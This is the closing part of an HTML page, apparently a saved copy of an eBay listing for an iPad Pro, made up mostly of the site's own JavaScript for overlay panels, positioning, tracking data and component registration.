		vjo.ctype('vjo.darwin.comp.overlaypanel.OverlayPanel').needs("vjo.dsf.client.Browser", "B").needs("vjo.dsf.Element", "E").needs("vjo.dsf.document.Shim", "S").needs("vjo.darwin.comp.utils.EventUtils", "EU").needs("vjo.dsf.EventDispatcher", "EV").needs("vjo.darwin.comp.utils.ServiceUtils", "SE").needs('vjo.Registry', "R").needs('vjo.darwin.comp.overlaypanel.OverlayAccessibilityUtil', 'OU').protos({
			aId: null,
			sA: null,
			eA: null,
			skip: false,
			nfe: null,
			cntDiv: null,
			lTd: null,
			fTd: null,
			constructs: function(jsmdl, props) {
				var t = this,
					J = t.vj$,
					B, p = props,
					M1 = jsmdl,
					E = J.E,
					I = p.id;
				t.cmpId = p.id;
				t.OID = p.OId;
				t.J = J;
				t.m = p;
				t.m1 = jsmdl;
				t.Open = false;
				t.cusPos = null;
				t.cW = p.CW;
				t.mst = -1;
				t.st = null;
				t.fCall = false;
				t.getS();
				t.dmProps();
				t.mW = t.m1.MW;
				t.nfe = J.E.get(M1.NFEI);
				var f1 = function(m) {
						if (!t.olp) {
							t.create();
						}
						t.open(m);
					},
					f2 = function(m) {
						t.close(m);
					};
				J.SE.rgSv(t.cmpId, t.i.o + p.id, f1);
				J.SE.rgSv(t.cmpId, t.i.c + p.id, f2);
			},
			rePos: function(t) {
				if (!t) t = this;
				if (t.Open && (t.refE || t.f.SIC)) {
					t.posPanel(t.olp, t.refE);
				}
			},
			open: function(msg) {
				var t = this;
				if (t.m1.AT && t.skip) {
					t.skip = false;
					return;
				}
				var f = function() {
					t.olp.style.visibility = "visible";
					t.Open = true;
					t.refE = t.J.E.get(msg.sAnchorId);
					t.posPanel(t.olp, t.J.E.get(msg.sAnchorId));
					if (t.sA && t.olp.offsetWidth > 0) {
						try {
							t.sA.focus();
						} catch (ex) {};
					}
					t.J.SE.sndM(t.i.po + t.cmpId);
				};
				if (t.f.HM) {
					var mskM = t.J.SE.gM(t.m1.MCO);
					mskM.containerId = t.sId;
					t.J.SE.sndM(mskM);
				}
				(!t.fCall) ? t.regEvt(): '';
				t.ST(t.cntDiv, t.m.CH);
				clearTimeout(t.st);
				t.st = setTimeout(f, t.od || 0);
			},
			create: function() {
				var t = this,
					p = t.m;
				var wrapper, leftSpace, topSpace, st, cntDiv, c2, cnt;
				if (t.f.TS)
					wrapper = (t.os == '2') ? t.CE('table', 'ov-w ov-sm') : t.CE('table', 'ov-w ' + (t.m.opt.CN || ''));
				else
					wrapper = (t.os == '2') ? t.CD('ov-w ov-sm') : t.CD('ov-w ' + (t.m.opt.CN || ''));
				wrapper.id = p.id;
				wrapper.style.position = "absolute";
				leftSpace = t.CE('b', '');
				topSpace = t.CE('i', '');
				if (t.f.TS)
				{
					wrapper.cellSpacing = '0';
					wrapper.cellPadding = '0';
					var tbody = t.CE('tbody', '');
					var topTr = t.CE('tr', '');
					var topTd = t.CE('td', 'ov-t');
					topTr.appendChild(topTd).appendChild(leftSpace).appendChild(topSpace);
					tbody.appendChild(topTr);
					t.fTd = topTd;
				}
				else
				{
					var innerWrapper = t.CD('ov-fl');
					innerWrapper.id = t.m.id + "olp-pad";
					wrapper.appendChild(innerWrapper);
					var topDiv = t.CD('ov-t');
					topDiv.id = t.cmpId + '_tpDiv';
					innerWrapper.appendChild(topDiv).appendChild(leftSpace).appendChild(topSpace);
				}
				st = ["20", "15", "10"];
				cntDiv = (t.f.PO) ? t.CD('ov-cnt ov-p' + st[t.os]) : t.CD('ov-cnt ov-p0');
				t.ST(cntDiv, p.CH, p.CW);
				cntDiv.id = 'cntw' + p.id;
				c2 = t.CD('ov-c2');
				cnt = t.J.E.get(t.m.cnId);
				var b = t.CE('b', ''),
					i = t.CE('i', '');
				if (t.f.TS)
				{
					var cntTr = t.CE('tr', '');
					var cntTd = t.CE('td', 'ov-c1');
					cntTr.appendChild(cntTd).appendChild(c2).appendChild(cntDiv);
					tbody.appendChild(cntTr);
					var footTr = t.CE('tr', '');
					var footTd = t.CE('td', 'ov-b');
					t.lTd = footTd;
					var lastElemId = t.cmpId + 'last';
					i.id = lastElemId;
					footTr.appendChild(footTd).appendChild(b).appendChild(i);
					tbody.appendChild(footTr);
					wrapper.appendChild(tbody);
				}
				else
				{
					var d5 = t.CD('ov-b');
					var midDiv = t.CD('ov-c1');
					innerWrapper.appendChild(midDiv).appendChild(c2).appendChild(cntDiv);
					innerWrapper.appendChild(t.CE('u', 'ov-clr'));
					innerWrapper.appendChild(d5).appendChild(b).appendChild(i);
				}
				cntDiv.appendChild(cnt);
				if (t.f.cbtn) {
					var close;
					if (t.os == 0) {
						close = t.CE('a', 'ov-cl');
					} else {
						close = t.CE('a', 'ov-cl-m');
					}
					var hTxt = t.CE('b', 'g-hdn');
					hTxt.innerHTML = t.m1.cbTxt;
					close.id = t.i.cb;
					close.href = "javascript:;"
					if (hTxt) close.appendChild(hTxt);
					cntDiv.appendChild(close);
				}
				if (t.f.ptr) {
					var ptr = t.CE('b', '');
					ptr.id = t.i.arrId;
					cntDiv.appendChild(ptr);
				}
				if (t.f.p2b) {
					document.body.appendChild(wrapper);
				} else {
					var cmp = t.vj$.E.get(t.OID);
					cmp.parentNode.insertBefore(wrapper, cmp);
				}
				var hide = function(msg) {
					if (t.m1.AT) {
						msg = t.J.SE.gM(t.i.cb + '_cBSv');
						msg.clsBtn = true;
					}
					t.close(msg);
				}
				if (t.f.cbtn)
					t.vj$.EU.add(t.cmpId, t.i.cb, "click", function(msg) {
						hide(msg);
					}, t);
				t.olp = wrapper;
				if (t.f.DG || t.f.HD) {
					var js = t.vj$.R.get(t.i.djs);
					if (js)
						js.regDrag();
				}
				if (t.m1.AT) {
					t.J.OU.createAnchors(t);
				}
				if (t.f.COM) {
					var fin = function() {
						t.onMin()
					};
					t.vj$.EU.add(t.cmpId, t.m.id, "mouseover", function() {
						t.setMState(1)
					}, t);
					t.vj$.EU.add(t.cmpId, t.m.id, "mouseout", function() {
						t.setMState(0)
					}, t);
					t.vj$.EU.add(t.cmpId, t.cmpId, "mouseover", fin, t);
					t.vj$.EU.add(t.cmpId, t.m.id, "mouseout", function(e) {
						t.onMout(e)
					}, t);
				}
				var outWr = t.vj$.E.get(t.m.OId);
				outWr.style.display = 'none';
			},
			dmProps: function() {
				var t = this;
				t.mp = t.m.opt;
				if (t.mp.JS) {}
				if (!t.mp.VF) {
					t.mp.VF = 0;
				}
				if (!t.mp.HF) {
					t.mp.HF = 0;
				}
				t.ha = t.mp.HA;
				t.va = t.mp.VA;
				t.cd = t.mp.CD;
				t.od = t.mp.OD;
				t.vns = t.mp.VNS;
				t.os = t.mp.OS;
				var num = t.m.m1;
				t.f = {};
				t.f.srbl = t.i2B(num, 0);
				t.f.cbtn = t.i2B(num, 1);
				t.f.COM = t.i2B(num, 2);
				t.f.COB = t.i2B(num, 3);
				t.f.STK = t.i2B(num, 4);
				t.f.DG = t.i2B(num, 5);
				t.f.SIC = t.i2B(num, 6);
				t.f.HM = t.i2B(num, 7);
				t.f.ptr = t.i2B(num, 8);
				t.f.CL = t.i2B(num, 9);
				t.f.p2b = t.i2B(num, 10);
				t.f.CAT = t.i2B(num, 11);
				t.f.HD = t.i2B(num, 12);
				t.f.PO = t.i2B(num, 13);
				t.f.FX = t.i2B(num, 14);
				t.f.TS = t.i2B(num, 15);
				t.f.COT = t.i2B(num, 16);
			},
			getS: function() {
				var t = this,
					M1 = t.m1;
				var s = M1.suffixes;
				t.i = {};
				t.i.o = s[0];
				t.i.c = s[1];
				t.i.po = s[2];
				t.i.pc = s[3];
				t.i.cb = t.cmpId + s[4];
				t.i.djs = t.cmpId + s[5];
				t.i.arrId = t.m.id + "arid";
				t.i.sa = t.cmpId + s[6];
				t.i.ea = t.cmpId + s[7];
			},
			CD: function(cls) {
				var t = this;
				return t.CE('div', cls);
			},
			CE: function(elm, cls) {
				var e = document.createElement(elm);
				if (cls != '') {
					e.className = cls;
				}
				return e;
			},
			ST: function(elm, ht, wd, vis) {
				if (!elm) return;
				if (typeof(ht) != 'undefined') elm.style.height = (ht == 0) ? "auto" : ht + "px";
				if (typeof(wd) != 'undefined') elm.style.width = (wd == 0) ? "auto" : wd + "px";
				if (this.mW > 0)
					elm.style.maxWidth = this.mW + 'px';
				if (vis)
					elm.style.visibility = vis;
				return elm;
			},
			i2B: function(num, idx) {
				var val = num.toString(2),
					l = val.length - 1,
					ds = (idx - l) < 0 ? -(idx - l) : (idx - l);
				if (idx >= val.length) {
					return false;
				}
				return (val.charAt(ds) == 1);
			},
			posPanel: function(olp, refElem) {
				var u = 'px',
					t = this,
					m = t.m;
				var fl1 = t.J.E.get("olp-pad");
				var cntDv = t.J.E.get('cntw' + t.m.id);
				var h = vjo.Registry.get(t.mp.JS);
				if (!h) {
					return;
				}
				var p = h.position(t.olp, refElem, t.ha, t.va, t.cmpId, t.f.srbl, t.mp.SH, t.mp.HF, t.mp.VF, t.f.SIC, null, t.f.HM, t.m.z, t.m.mz, cntDv, t.vns, t.f.CAT, t.f.FX);
			},
			close: function(message) {
				var t = this,
					f = function() {
						if (!t.olp) return;
						var s = t.olp.style;
						s.visibility = 'hidden';
						s.left = "-9999px";
						t.Open = false;
						t.ST(t.cntDiv, 0);
						var isRetire = (message && message.isRetire);
						if (!isRetire) {
							t.J.SE.sndM(t.i.pc + t.cmpId);
							if (t.f.HM)
								t.J.SE.sndM(t.m1.MCI);
						}
						if (message && message.clsBtn) {
							t.J.SE.sndM(t.i.cb + '_cBSv');
						}
					};
				if (t.f.COT)
					clearTimeout(t.st);
				t.J.SE.sndM('PRC' + t.cmpId);
				clearTimeout(t.ct);
				t.ct = setTimeout(f, (message && message.ignDelay) ? 0 : t.cd);
			},
			setMState: function(state) {
				this.mst = state;
			},
			onMout: function(evt) {
				var t = this,
					e = evt.nativeEvent,
					pEle = e.toElement || e.relatedTarget;
				if (!t.f.COM || (t.olp && t.J.E.containsElement(t.olp, pEle))) {
					return;
				}
				t.close();
			},
			onMin: function() {
				if (this.f.COM)
					clearTimeout(this.ct);
			},
			onResize: function(t) {
				if (!t) t = this;
				if (t.Open && (t.refE || t.f.SIC)) {
					t.posPanel(t.olp, t.refE);
				}
			},
			regEvt: function() {
				var t = this,
					rF = function() {
						t.onResize(t);
					};
				if (!t.f.STK && !t.f.FX) {
					t.rgEH('resize', rF);
					t.rgEH('scroll', rF);
				}
				var f1 = function(e) {
					if (!t.Open) return;
					var el = e.nativeEvent.srcElement || e.nativeEvent.target;
					if (!t.f.COB)
						return;
					while (el) {
						if (el.id == t.cmpId || (t.refE && t.refE.id == el.id)) {
							return;
						}
						el = el.parentNode;
					}
					t.close();
				};
				t.vj$.EU.add(t.cmpId, 'body', 'click', f1, t);
				t.fCall = true;
			},
			rgEH: function(evt, hnd) {
				this.J.EV.addEventListener(window, evt, hnd, window);
			}
		}).props({
			olps: [],
			olpMsg: function(messageId, anchorId, cnt, model, ho, delay) {
				var o = this.vj$.SE,
					m = o.gM(messageId);
				m.sAnchorId = anchorId;
				if (cnt) m.cnt = cnt;
				if (model) m.model = model;
				if (ho != null) m.ho = ho;
				if (delay != null) m.ignDelay = delay;
				o.sndM(m);
			},
			closeOverlays: function(onlyOnBodyClick) {
				var olp = vjo.darwin.comp.overlaypanel.OverlayPanel;
				for (var i = 0; i < olp.olps.length; i++) {
					if (olp.olps[i] && (!onlyOnBodyClick || olp.olps[i].f.COB)) {
						olp.olps[i].close();
					}
				}
			},
			sendMessage: function(svcId, model) {
				this.olpMsg(svcId, model.anchorId, model.cnt, model);
			},
			registerEvent: function(model, openServiceId, closeServiceId, openEvent, closeEvent) {
				var t = this,
					handler = vjo.dsf.EventDispatcher,
					f1 = function() {
						t.sendMessage(openServiceId, model)
					},
					f2 = function() {
						t.sendMessage(closeServiceId, model)
					};
				handler.add(model.anchorId, openEvent, f1, t);
				handler.add(model.anchorId, closeEvent, f2, t);
			}
		}).endType();


		vjo.ctype("vjo.darwin.comp.utils.WindowDimension").props({
			D: undefined,
			getBrowserDimension: function() {
				var s = self;
				var d = document;
				var de = d.documentElement;
				if (s.innerHeight) {
					return [s.innerWidth, s.innerHeight];
				} else if (de && de.clientHeight) {
					return [de.clientWidth, de.clientHeight];
				}
				return [d.body.clientWidth, d.body.clientHeight];
			},
			getScrollXY: function() {
				var scrOfX = 0,
					scrOfY = 0,
					scrOfH = 0,
					scrOfW = 0,
					d = document.documentElement || document.body;
				if (typeof(window.pageYOffset) == 'number') {
					return [window.pageXOffset, window.pageYOffset, document.height, document.width];
				} else if (d) {
					return [d.scrollLeft, d.scrollTop, d.scrollHeight, d.scrollWidth];
				}
				return [scrOfX, scrOfY, scrOfH, scrOfW];
			},
			getOffsetPosition: function(poElem) {
				if (!poElem) {
					return;
				}
				var e = poElem,
					l = 0,
					t = 0,
					z = 0,
					tz, h = e.offsetHeight,
					w = e.offsetWidth;
				while (e)
				{
					l += e.offsetLeft;
					t += e.offsetTop;
					if (e.style) {
						tz = parseInt(e.style.zIndex, 10);
						z = !isNaN(tz) && tz > z ? tz : z;
					}
					e = e.offsetParent;
				}
				return [l, t, z, h, w];
			}
		}).endType();


		vjo.ctype("vjo.darwin.comp.overlaypanel.ZIndexUtil").props({
			getNewZIndex: function(hasM, mzid, bzid, czid) {
				if (!bzid && !czid) {
					return 0;
				}
				var z = ((hasM == false) ? mzid : bzid);
				z = (czid && czid >= z) ? czid : z;
				return (z + 10);
			}
		}).endType();


		vjo.ctype("vjo.darwin.comp.overlaypanel.harrow.OverlayPanelWithHArrow").needs("vjo.darwin.comp.utils.WindowDimension").needs("vjo.dsf.Element", "E").needs("vjo.darwin.comp.overlaypanel.ZIndexUtil", "ZU").needs("vjo.dsf.client.Browser", "B").protos({
			st: null,
			yof: 0,
			aHW: null,
			pP: null,
			ar: null,
			preX: null,
			preY: null,
			IE: null,
			constructs: function(jsModel, bubble) {
				var t = this;
				t.m = jsModel;
				var E = t.E = t.vj$.E;
				t.bbl = bubble;
				t.st = t.m.styles;
				t.yof = t.m.yof;
				t.aHW = t.m.arH;
				t.pP = t.m.pointPos;
				t.arrId = t.m.arrId;
				t.preX;
				t.preY;
				var b = t.vj$.B;
				t.IE = (b.bIE && b.iVer <= 6);
				t.aH = t.m.arH;
				t.aW = t.m.arW;
				t.os = t.m.OS;
			},
			W: vjo.darwin.comp.utils.WindowDimension,
			position: function(olp, refElem, halign, valign, overlayCompId, scrbl, scrlH, HOF, VOF, SIC, CID, HM, zid, mzid, oc, vns, CAT)
			{
				var t = this,
					tp = 'top',
					b = 'bottom',
					r = 'right',
					l = 'left',
					u = 'px',
					ocS = oc.style,
					id = overlayCompId,
					scrbl = scrbl,
					scrlH = scrlH,
					z = 0;
				var ofst = 10,
					aHW = parseInt(t.aHW),
					hof = HOF;
				var aH = parseInt(t.aH);
				var aW = parseInt(t.aW);
				var yof = -aH;
				var xof = -aW;
				var P = t.P,
					olpS = olp.style,
					iW = olp.offsetWidth,
					iH = olp.offsetHeight,
					iZ = 0;
				var W = t.W,
					wD = W.getBrowserDimension(),
					aS = W.getScrollXY();
				var finalX, finalY;
				t.ar = t.vj$.E.get(t.arrId);
				if (!t.ar) {
					t.ar = document.createElement('div');
					t.ar.style.display = 'none';
				}
				if (refElem)
				{
					var rH = refElem.offsetHeight,
						pP = (t.pP == 'CENTER') ? (rH / 2) : ((t.pP == 'TOP') ? 0 : rH),
						rW = refElem.offsetWidth,
						oP = W.getOffsetPosition(refElem),
						rX = oP[0],
						rY = oP[1] + pP,
						x = rX - aS[0],
						y = rY - aS[1],
						aX = 0,
						aY = 0,
						vAl = b,
						hAl;
					hof = hof + rW - xof;
					if (((iH < (wD[1] - y + aH)) && valign == 'a') || (valign == 'b'))
					{
						finalY = (rY + yof);
						if (t.bbl) olpS.marginTop = '-4px';
					}
					else if (((iH < y) && valign == 'a') || (valign == 'tp'))
					{
						finalY = (rY - iH - yof);
						if (t.bbl) olpS.marginTop = '-16px';
						vAl = tp;
					}
					else
					{
						finalY = ((y < (wD[1] / 2)) ? (y - 30) : (y - iH + ofst + 30)) + aS[1];
						if (t.bbl) {
							finalY = finalY = (rY + yof);
							olpS.marginTop = '-1px';
						}
					}
					var iW = olp.offsetWidth;
					var rW = refElem.offsetWidth,
						rX = oP[0];
					var arS = t.ar.style;
					arS.display = '';
					if ((((iW + ofst + hof) < (wD[0] - x)) && halign == 'a') || (halign == 'l'))
					{
						finalX = rX + hof;
						if (t.bbl) olpS.marginLeft = '-24px';
						hAl = l;
					}
					else if ((((iW + ofst + hof) < x) && halign == 'a') || (halign == 'r')) {
						finalX = ((rX + rW) - iW - hof) + 20;
						if (t.bbl) olpS.marginLeft = '22px';
						hAl = r;
					}
					else {
						if (t.bbl) {
							finalX = rX + hof;
							olpS.marginLeft = '-22px';
							hAl = l;
						} else {
							finalX = (wD[0] - iW) / 2 + aS[0];
							if (vns != -1)
								finalY = (vns == 0) ? (rY + rH) : (rY - iH - 10);
							arS.display = 'none';
						}
					}
					iZ = oP[2] ? oP[2] : iZ;
				}
				var tY = t.gAP(finalX, finalY, iW, iH, rX, rY, pP, rH, hAl, vAl);
				t.ar.className = t.gAS(hAl, vAl, t.st);
				arS.zIndex = "999";
				if (vAl == tp) {
					finalY = finalY - VOF;
				} else {
					finalY = finalY + VOF;
				}
				if (olp.offsetParent) {
					var offP = W.getOffsetPosition(olp.offsetParent);
					if (offP) {
						finalX = finalX - offP[0];
						finalY = finalY - offP[1];
					}
				}
				olpS.left = finalX + u;
				olpS.top = finalY + u;
				z = t.vj$.ZU.getNewZIndex(HM, zid, mzid, iZ);
				olpS.zIndex = z;
				if (valign != 'b') {
					if (finalY < 0) {
						var tpStr = arS.top;
						var itp = parseInt(tpStr.replace('px', ''));
						arS.top = itp + finalY + 'px';
						olpS.top = '0';
					}
				}
				return [finalX, finalY, iW, iH, hAl, vAl, z];
			},
			gAP: function(oX, oY, oW, oH, rX, rY, pP, rH, hAl, vAl) {
				var t = this,
					a = t.ar.style,
					yof = t.yof,
					u = 'px',
					la = 17,
					ra = 30,
					ta = 22,
					oldaW = t.aW;
				if (t.aH < 44 && !t.bbl) {
					la = 13;
					ta = 16;
					ra = 26;
				}
				if (t.bbl) {
					la = 22;
					ra = 29;
				}
				a.position = 'absolute';
				a.top = (((rY - oY) > oH / 2) ? -5 : 0) + (rY - oY - ta) + u
				if (t.bbl) {
					a.top = ((vAl == 'top') ? +12 : 0) + (rY - oY - ta) + u;
				}
				if (rX < oX) {
					a.left = -la + u;
					a.right = '';
				} else {
					if (!t.bbl) {
						t.aW = (t.aH < 44) ? 27 : 31;
					}
					if (t.bbl) {
						a.top = ((vAl == 'top') ? +11 : 0) + (rY - oY - ta) + u;
					}
					a.right = -ra + u;
					a.left = '';
				}
				if (!t.bbl) {
					a.height = t.aH + u;
					a.width = t.aW + u;
				}
				t.aW = oldaW;
			},
			gAS: function(hAl, vAl, st) {
				var bLeft = (hAl == 'left')
				if (vAl == 'top') {
					return bLeft ? st[1] : st[3];
				} else {
					return bLeft ? st[0] : st[2];
				}
			}
		}).endType();


		vjo.ctype("vjo.darwin.tracking.sojourner.SojData").props({
			sojD: null
		}).endType();


		vjo.ctype("vjo.darwin.tracking.sojourner.CalData").props({
			setData: function(svcId, data) {
				if (!svcId || !data) {
					return;
				}
				this.cal[svcId] = data;
			},
			getData: function(svcId) {
				if (svcId) {
					return this.cal[svcId];
				}
			}
		}).inits(function() {
			this.cal = {};
		}).endType();


		vjo.ctype("vjo.darwin.tracking.sojourner.TrackingRespHdl").needs(["vjo.darwin.tracking.sojourner.SojData", "vjo.darwin.tracking.sojourner.CalData"]).props({
			handleResponse: function(msg) {
				if (msg.errors && msg.errors.length > 0) {
					this.vj$.SojData.sojD = "";
				}
				if (msg.response && msg.response.dataMap && msg.response.dataMap.SOJDATA) {
					this.vj$.SojData.sojD = msg.response.dataMap.SOJDATA;
				}
				if (msg.response && msg.response.dataMap && msg.response.dataMap.TDATA) {
					this.vj$.CalData.setData(msg.svcId, msg.response.dataMap.TDATA);
				}
			}
		}).endType();
	</script>
    <script type="text/javascript">
		vjo.darwin.comp.utils.EventUtils.callOnLoad(["Js-v4-2"]);
		vjo.darwin.tracking.rover.Rover.roverTrack();
		(function() {
			var _r = vjo.Registry;

			function $o0(p0_0, p0_1, p0_3, p0_4, p0_5, p0_6) {
				return new vjo.darwin.comp.overlaypanel.harrow.OverlayPanelWithHArrow({
					yof: p0_0,
					styles: p0_1,
					pointPos: "CENTER",
					OS: p0_3,
					arW: p0_4,
					arH: p0_5,
					arrId: p0_6
				}, false);
			};

			function $o2(p1_0, p1_1, p1_2, p1_4, p1_6, p1_7) {
				return new vjo.darwin.comp.overlaypanel.OverlayPanel({
					cbTxt: "Click to close",
					s: null,
					MCI: null,
					AT: 1,
					MCO: null,
					MW: 0,
					NFEI: null,
					suffixes: ["O", "C", "PO", "PC", "_CB", "_DJS", "_stA", "_enA"]
				}, {
					opt: p1_0,
					m1: p1_1,
					CW: p1_2,
					CH: 0,
					cnId: p1_4,
					z: 4000,
					OId: p1_6,
					id: p1_7,
					mz: 6000
				});
			};
			_r.put('ic_js_v4-1', new vjo.darwin.core.imagecontainer.ImageContainer({
				"errId": "v4-1_e",
				"cmpId": "v4-1",
				"IDivId": "v4-1_idiv",
				"err": null,
				"width": 200,
				"height": 200,
				"bdrId": "v4-1_bdiv",
				"imgData": {
					"src": "images/poza1.jpg",
					"customAttributes": {},
					"alt": "BRAND NEW iPad Pro 4th Gen Wi-Fi +Cellular(unocked). 1TB 12.9 in Space Gray",
					"href": null
				},
				"clkSrvId": "IMG_CNTR_CLICKED_v4-1",
				"thrbText": "",
				"reszOnLd": true,
				"ancId": "v4-1_a",
				"errText": "Image not available",
				"loadSvcId": "LOAD_IMG_SRVC_ID_v4-1",
				"clkLstrKey": null,
				"imgId": "i_v4-1",
				"thr": null,
				"thrbId": "v4-1_t"
			}));
			_r.put('CBT_SHIP_OVRjsid', $o0(16, ["ov-ptr ov-pl", "ov-ptr ov-pl", "ov-ptr ov-pr", "ov-ptr ov-pr"], {
				"value": 0,
				"id": 0,
				"name": "Large",
				"integer": 0
			}, "17", "45", "CBT_SHIP_OVRarid"));
			_r.put('Js-CBT_SHIP_OVR', $o2({
				"OS": 0,
				"HA": "a",
				"JS": "CBT_SHIP_OVRjsid",
				"VA": "a",
				"VNS": -1
			}, 8458, 320, "cnCBT_SHIP_OVR", "CBT_SHIP_OVROly_Outer", "CBT_SHIP_OVR"));
			_r.put('Js-v4-2', new vjo.darwin.comp.button.Button({
				"FName": null,
				"BT": "pb-L",
				"scope": "bn",
				"subScope": "pb",
				"LId": "txt_v4-2",
				"svcId": "BTN_SBMT_SRV_v4-2",
				"tp": 1,
				"BId": "but_v4-2",
				"SId": "spn_v4-2",
				"dis": false
			}));
			_r.put('overlayPanelDefault_p_bo-v4-3jsid', $o0(12, ["ov-ptr ov-pls", "ov-ptr ov-pls", "ov-ptr ov-prs", "ov-ptr ov-prs"], {
				"value": 2,
				"id": 2,
				"name": "Small",
				"integer": 2
			}, "13", "34", "overlayPanelDefault_p_bo-v4-3arid"));
			_r.put('Js-overlayPanelDefault_p_bo-v4-3', $o2({
				"CD": 300,
				"OS": 2,
				"HA": "a",
				"JS": "overlayPanelDefault_p_bo-v4-3jsid",
				"VA": "a",
				"VNS": -1
			}, 8460, 300, "cnoverlayPanelDefault_p_bo-v4-3", "overlayPanelDefault_p_bo-v4-3Oly_Outer", "overlayPanelDefault_p_bo-v4-3"));
			_r.put('8', new vjo.darwin.comp.base.Base());
		})();
		(function() {
			var _d = vjo.dsf.EventDispatcher;
			var _r = vjo.Registry;

			function $0(p0, p1) {
				return function(event) {
					return this.olpMsg(p0, p1);
				};
			};
			_r.put('rewardsObj', new vjo.ebay.darwin.pres.rewards.Rewards({
				"panelOpenServiceId": null,
				"couponLabelDiv": null,
				"couponDisplaySectionId": null,
				"showMeAnchorId": null,
				"couponDivId": null,
				"aDivToShow": null,
				"groupingIncentive": false,
				"contentBmlDiv": ["bmlpromoId"],
				"incOvlyCloseServiceId": null,
				"contentBmlCoreDiv": ["bmlcoreId"],
				"splOffersDiv": null,
				"aDivToHide": null,
				"couponOverlayCtnId": null,
				"aRewardsDiv": ["rewards_div"],
				"STP": false,
				"incOvlyCmpId": null,
				"couponLinkDiv": null,
				"incOvlyOpenServiceId": null,
				"map": false,
				"panelCloseServiceId": null,
				"sRewardsUrl": "http://rewards.ebay.com/ws/eBayISAPI.dll?GetRewardsInfo&item=331678389084&ShowRewards=true&quantity=1",
				"bmlDisplaySectionId": ["bmlLbl", null],
				"splOffersIcon": null
			}));
			_d.add('CBT_SHIP_LAYER_TIER2=2', 'click', function(event) {
				this.setRover("p5466", "12963");
			}, vjo.darwin.pres.buying.cmp.utils.RoverUtils);
			_d.add('CBT_SHIP_LAYER_TIER2=2', 'click', $0("OCBT_SHIP_OVR", "CBT_SHIP_LAYER_TIER2=2"), vjo.darwin.comp.overlaypanel.OverlayPanel);
			_d.add('body', 'load', _r.get('rewardsObj'));
			_d.add('reviewbin', 'submit', function(event) {
				return this.onSubmit("BTN_SBMT_SRV_v4-2", event);
			}, vjo.darwin.comp.button.Button);
			_d.add('bo-v4-4', 'mouseover', $0("OoverlayPanelDefault_p_bo-v4-3", "bo-v4-4"), vjo.darwin.comp.overlaypanel.OverlayPanel);
			_d.add('bo-v4-4', 'mouseout', $0("CoverlayPanelDefault_p_bo-v4-3", "bo-v4-4"), vjo.darwin.comp.overlaypanel.OverlayPanel);
		})();
		(function() {
			var _s = vjo.dsf.ServiceEngine,
				$se = _s.register;
			var _r = vjo.Registry;

			$se(4, 'BTN_SBMT_SRV_v4-2', function(message) {
				_r.get('Js-v4-2').disable();
			});
		})();
	</script>
    <script type="text/javascript">
		vjo.ctype("vjo.dsf.FirePageLoad").endType();
		if (typeof(oGaugeInfo) != "undefined") {
			oGaugeInfo.iLoadST = (new Date()).getTime();
		}
		vjo.dsf.EventDispatcher.load(document.body);
	</script>
  </body>
</html>
